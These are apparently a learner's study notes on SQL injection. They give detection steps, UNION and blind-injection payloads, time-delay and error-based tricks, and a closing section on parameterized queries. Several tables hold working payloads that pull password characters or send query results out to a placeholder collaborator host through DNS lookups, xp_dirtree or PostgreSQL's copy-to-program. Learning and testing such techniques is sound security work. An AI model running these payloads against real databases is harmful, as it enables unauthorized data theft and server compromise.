- [General Concept](#general-concept)
- [Detection](#detection)
- [Methods](#methods)
  - [Determining number of Columns](#determining-number-of-cols)
  - [Column Datatype](#column-datatype)
  - [String Concat](#string-concat)
  - [DB Metadata](#db-metadata)
    - [Type + Version](#type-and-version)
    - [DB Contents](#db-contents)
      - [Tables](#tables)
      - [Columns](#columns)
- [Blind SQLi](#blind-sqli)
  - [Techniques](#techniques)
    - [Conditional Output](#conditional-output)
      - [Substring Method](#substring-method)
    - [Error-Based](#error-based)
      - [Conditional Errors](#conditional-errors)
      - [Verbose Error Messages](#verbose-error-messages)
      - [Time Delays](#time-delays)
      - [Out-of-Band](#out-of-band-oast)
        - [Exfil](#exfil)
- [Second Order](#second-order-sqli-stored-sqli)
- [SLQi prevention](#sqli-prevention)
# General Concept
WebSec vuln that allows attackers to interfere with queries that an app makes. Allows them to view/modify/delete data they wouldn't
normally have, getting access to sensitive areas or changing default functions. Sometimes can compromise the underlying server/back-end 
infrastructure or perform DOS attacks.

# Detection
Manually with a series of tests:
- Single quote `'` and look for errors/anomalies
- SQL-specific syntax that evaluates to the original value, then a different value to see differences in responses
- Boolean conditions (OR 1=1, OR 1=2) and look for differences
- Payloads designed to trigger time delays

Can also scan with third-party tools (Burp Scanner)

# Methods
## Determining Number of Cols
If the SQL is in the WHERE clause you can use `' ORDER BY #--` starting with 1, then going up
until an error is thrown. 

More broadly can do: 
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Which will hopefully return some sort of error when the number of columns is incorrect. 

## Column Datatype
NULL will work with any datatype, then move the text through until an error isn't thrown. 
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

## String Concat
If you only have one column to work with, can use string concatenation (syntax is host-dependent) to
get the info from multiple columns returned into one (with some separator to know which is which)

| host | syntax|
| ---- | ----- |
| Oracle | `'foo'\|\|'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'\|\|'bar'` |
| MySQL | `'foo' 'bar'` |
| MySQL | `CONCAT('foo', 'bar')` |

## DB Metadata
### Type and Version
Can use with UNION attack

| host | syntax|
| ---- | ----- |
| Oracle | `SELECT banner FROM v$version` |
| Oracle | `SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | ` SELECT version()` |
| MySQL | `SELECT @@version` |

### DB Contents
#### Tables
| host | syntax|
| ---- | ----- |
| Oracle | `SELECT * FROM all_tables` |
| Microsoft | `SELECT * FROM information_schema.tables` |
| PostgreSQL | `SELECT * from information_schema.tables` |
| MySQL | `SELECT * from information_schema.tables` |

#### Columns
| host | syntax|
| ---- | ----- |
| Oracle | `SELECT all_tab_columns WHERE table_name = 'example-table'` |
| Microsoft | `SELECT * from information_schema.columns WHERE table_name = 'example-table'` |
| PostgreSQL | `SELECT * from information_schema.columns WHERE table_name = 'example-table'` |
| MySQL | `SELECT * from information_schema.columns WHERE table_name = 'example-table'` |

# Blind SQLi 
When an app is vulnerable to SQLi but the HTTP response doesn't contain the result of the query or the details of the DB errors.
Things like UNION attacks aren't effective because they rely on seeing the injected query's results in the response

## Techniques
### Conditional Output
Inject something like `' AND 1=1` or `' AND 1=2` and see how the app responds. 
Useful with things like brute-forcing a password using the `SUBSTRING()` method. 

#### Substring Method
| host | syntax|
| ---- | ----- |
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

### Error-Based 
#### Conditional Errors
Error only triggers if a condition is true. 

```
Ex.
  ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

When the first letter in the password for administrator is greater than m, a divide by zero error occurs,
otherwise it should proceed as normal
```

| host | syntax|
| ---- | ----- |
| Oracle | `SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END` |
| MySQL | `SELECT IF(condition, (SELECT table-name FROM information_schema.tables),'a')` |

#### Verbose Error Messages
Sometimes able to get app to generate an error message that leaks some of the data that gets returned by query. 
Essentially turns blind SLQi vuln into a visible one. 

Use `CAST()` function to convert one data type to another. 
```
Ex.
  CAST((SELECT example_column FROM example_table) AS int)

ERROR: invalid input syntax for type integer: "Example data"
```

| host | syntax| error |
| ---- | ----- | ----- |
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` | `Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` | `invalid input syntax for integer: "secret"` |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` | `XPATH syntax error: '\secret'` |


#### Time Delays
Often possible to exploit blind SQLi by triggering time delays depending on whether an injection condition
is true/false. SQL queries are normally processed synchronously, so the DB delay also delays the HTTP response. 

```
Ex.
   '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

Below are the syntaxes to sleep for 10 seconds. 
| host | syntax|
| ---- | ----- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `pg_sleep(10)` |
| MySQL | `SLEEP(10)` |

#### Out-Of-Band (OAST) 
An app might do an SQL query asynchronously. In that case, you can often exploit the vulnerability by triggering out-of-band network
interactions to a system that you control. They can be triggered based on a condition to infer information one piece
at a time, and (more useful) data can be exfiltrated directly within the network interaction. A variety of protocols can be used, but
DNS is typically the most effective. 

Tool: Burp Collector (pro version only) 

```
Ex.
  '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

| host | syntax | notes |
| ---- | ------ | ----- |
| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` | XXE vulnerability, has been patched but there are still a lot of unpatched installations in the wild |
| Oracle | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` | works on fully patched, requires elevated priv. |
| Microsoft | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` ||
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` ||
| MySQL | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` | windows only |
| MySQL | `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` | windows only |

##### Exfil

| host | syntax | notes |
| ---- | ------ | ----- |
| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` ||
| Microsoft | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` ||
| PostgreSQL | `create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();` ||
| MySQL | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` | windows only |

# Second-Order SQLi (Stored SQLi)
When the app takes user input from HTTP and stores it for future use (rather than using it right away -- first-order SQLi).
Usually places the input into a DB and the vulnerability triggers when a different HTTP request causes it to 
retrieve the injection in an unsafe way. Devs are often aware of SQLi and safely handle the initial placement, 
but once it's in the DB it's already been deemed safe so they don't have the same protections. 

# SQLi Prevention
You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query
Can prevent most SQLi using parameterized queries instead of string concat in the query. 

```
**bad**
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

**rewritten -- prevents input from interfering with the query structure**
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

This can't be used for sensitive stuff like column or table names, then you'd have to have extra logic to handle it. 
